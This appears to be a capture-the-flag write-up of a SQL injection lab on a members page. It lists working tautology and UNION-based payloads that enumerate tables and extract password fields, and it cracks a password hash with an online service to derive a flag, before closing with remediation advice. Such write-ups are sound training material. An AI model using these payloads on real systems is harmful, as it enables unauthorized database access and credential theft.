## SQL Injection Vulnerability

### Summary
A SQL injection vulnerability was identified in the members page. User input is directly embedded into SQL queries without proper validation or sanitization, allowing attackers to manipulate database queries.

### Methodology
1. Observed that the query structure resembles:
	```sql
	WHERE id = ${USER_INPUT}
	```
2. Tested with the payload:
	```sql
	1 or 1=1
	```
	- Confirmed that the injection works and reveals a user named 'Flag'.
3. Determined the number of columns in the dataset (two columns) and identified the table `Member_Sql_Injection.users`.
4. Used UNION-based injections to enumerate columns and tables:
	- `1 union select null, null from user;`
	- `1 union select null, null, null from users;`
	- `1 union select column_name, table_name from information_schema.columns`
5. Extracted sensitive fields:
	- `1 union select Commentaire, countersign from users`

### Findings
- The application is vulnerable to SQL injection, exposing user data and internal database structure.
- Attackers can enumerate tables, columns, and extract sensitive information, including authentication data and flags.

### Password Decryption Example
Hint provided: "Decrypt this password -> then lower all the char. Sh256 on it and it's good!"
Password hash: `5ff9d0165b4f92b14994e5c685cdce28`
Steps:
1. Use https://crackstation.net to crack the hash. Result: `FortyTwo`
2. Convert to lowercase: `fortytwo`
3. Generate SHA-256 hash:
	```
	sha256 -s fortytwo
	```

### Recommendation
- Implement parameterized queries and input validation to prevent SQL injection.
- Regularly audit code for insecure database interactions.
